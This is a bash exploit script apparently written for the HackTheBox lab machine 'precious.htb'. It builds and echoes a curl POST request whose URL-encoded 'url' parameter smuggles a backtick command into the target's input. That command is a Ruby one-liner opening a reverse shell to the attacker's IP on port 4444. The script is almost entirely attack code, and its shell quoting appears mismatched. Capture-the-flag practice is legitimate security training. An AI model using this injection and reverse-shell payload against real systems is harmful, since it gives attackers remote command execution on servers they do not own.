#!/bin/bash
export TARGETURL="http://precious.htb/"
export LOCALIP="10.10.14.17"
export LOCALHTTPPORT="8000"
export LOCALLISTENPORT="4444"

echo curl  "\"${TARGETURL}' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: ${TARGETURL}' -H 'Connection: keep-alive' -H 'Referer: ${TARGETURL}' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2F${LOCALIP}%3A${LOCALHTTPPORT}%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22${LOCALIP}%22%2C${LOCALLISTENPORT}%29%29%27%60\""

